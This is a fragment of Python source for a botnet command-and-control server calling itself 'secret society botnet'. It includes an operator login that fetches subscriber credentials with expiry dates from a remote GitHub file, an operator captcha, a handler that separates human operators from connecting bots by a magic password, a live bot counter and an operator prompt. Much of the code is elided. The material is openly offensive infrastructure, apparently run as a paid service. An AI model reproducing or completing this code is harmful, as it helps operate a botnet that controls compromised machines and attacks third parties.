...
▐█▄▪▐█▐█▄▄▌▐███▌▐█•█▌▐█▄▄▌ ▐█▌·    ▐█▄▪▐█▐█▌.▐▌▐███▌▐█▌▐█▄▄▌ ▐█▌· ▐█▀·.
 ▀▀▀▀  ▀▀▀ ·▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀      ▀▀▀▀  ▀█▄▀▪·▀▀▀ ▀▀▀ ▀▀▀  ▀▀▀   ▀ •                                         
        ( Type "help" for Commands )      
           ( secret society botnet )        
'''

bannerLogin = '''
            (  secret society botnet )
          ( bangladesh cyber squad )
        Thank you for using secret society botnet
'''
...
def find_login(client, username, password):
    ...
    url = "https://raw.githubusercontent.com/system32hacktool/Systemmodule/refs/heads/main/logins.txt"

    try:
        r = requests.get(url, timeout=5)
        r.raise_for_status()
        credentials = [line.strip() for line in r.text.splitlines() if line.strip()]
    except Exception as e:
        try:
            send(client, f"{gray}Failed to fetch login data.")
        except Exception:
            pass
        try:
            client.close()
            ...
            pass
        return False, None  # Return None for expiration

    for line in credentials:
        try:
            c_username, c_password, data_Expiration_str = [p.strip() for p in line.split(':', 2)]
            data_expiration = datetime.strptime(data_Expiration_str, '%Y-%m-%d').date()
        except ValueError:
            continue

        if c_username.lower() == username.lower() and c_password == password:
            if data_expiration < date.today():
                print(f"\nThe {c_username} expired. {data_Expiration_str}\n")
                try:
            ...
            return True, data_Expiration_str  # Return expiration string
...
def captcha(send, client, grey):
    ...
    while x is None:
        try:
            data = client.recv(1024).decode('cp1252', errors='ignore').strip()
            if not data:
            ...
            if numeric_data:
                ...
                send(client, f'{grey}Please enter numbers only: ', False, False)
        except Exception as e:
            print(f"Captcha recv error: {e}")
            client.close()
            return
...
def handle_client(client, address):
    ...
    if password != '\xff\xff\xff\xff\75':
        ...
        success, data_Expiration_str = find_login(client, username, password)
        if not success:
            try:
                send(client, f'\033[31mInvalid credentials')
            except OSError:
                pass
            time.sleep(1)
            client.close()
        ...
        return  # Stop here for human login

    # Bot login (password matches bot signature)
    if password == '\xff\xff\xff\xff\75':
...
def update_title(client, name, expires):
    while 1:
        try:
            send(client, f"\33]0;secret society C2 | Bots online: {len(bots)} | Username: {name} | Expires: {expires} \a", False)
            time.sleep(0.6)
        except:
            client.close()
...
def command_line(client, username):
    ...
    prompt = f'{color("LIGHTBLSYN_EX")}({color("WHITE")}secretsociety{color("LIGHTBLSYN_EX")}@{color("CYAN")}{username}{color("LIGHTBLSYN_EX")}) > {color("LIGHTBLSYN_EX")}'
